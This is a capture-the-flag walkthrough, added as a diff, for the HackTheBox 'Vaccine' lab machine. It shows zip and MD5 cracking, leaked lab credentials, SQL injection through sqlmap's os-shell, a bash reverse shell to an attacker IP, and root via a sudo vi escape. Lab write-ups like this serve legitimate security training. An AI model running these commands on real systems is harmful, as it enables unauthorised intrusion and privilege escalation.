@@ -1,0 +1,66 @@
+Vaccine is another linux based OS of starting point lab hackthebox.Let's get started
+
+i. Enumeration
+==============
+#nmap -sC -sV -p- --min-rate=1000 -T4 -oN vaccinescan <ip>
+-> We will be enumerating the services and open ports
+
+After enumeration we found three interesting ports:
+ftp,ssh and http
+
+-> In previous machine,we found some credentials for ftp
+name: ftpuser
+password:  mc@F1l3ZilL4
+
+-> After logging in, we got a file named backup.zip which is password protected. So,let's crack it using john
+  # zip2john backup.zip > hash
+  # john hash
+  - We got a password for zip file
+  
+-> Unzipping the file gives us some interesting files
+  # cat index.php
+  - Copy the admin hash and crack the given md5 from crackstation
+  - Password we got from there is qwerty789
+  
+-> Now we are into the website 
+
+ii. Initial Access
+==================
+-> There is a search lookup page which is vulnerable to SQL injection.Now, we will use sqlmap to gain initial access to the shell.
+-> Intercept the request using burp and save the request
+-> Sqlmap tool to access the shell
+  #sqlmap -r requestfile --batch
+  # sqlmap -r requestfile --os-shell
+  
+-> Now we have got access to the shell. It's time to get reverse shell on our local machine which can be achieved using bash.
+
+  # bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'
+  -> We got shell
+  
+ -> Let's have a look at the given folder.There is a file named dashboad.php which gives us some credentials for postgresql login
+  
+ user: postgres
+ password: P@s5w0rd!
+ 
+ 
+ Let's find the user flag now.
+ # find / -type f -name user.txt 2>/dev/null
+ - Copy the user flag
+ 
+ 
+iii. Privilege Escalation
+=========================
+-> To escalate privilege we will enumerate the machine.
+First upgrade our shell:
+# python -c "import pty;pty.spawn('/bin/bash');"
+- Our shell will be upgraded
+# sudo -l
+- Use the previous password and it show us sudoers file
+- We can use vi to file named pg_hba.conf
+
+Let's use this sudoer's file to gain access to the root
+
+# sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+ press (ESC):!/bin/bash
+ 
+ We are now root!!!! Copy the flag from root folder.
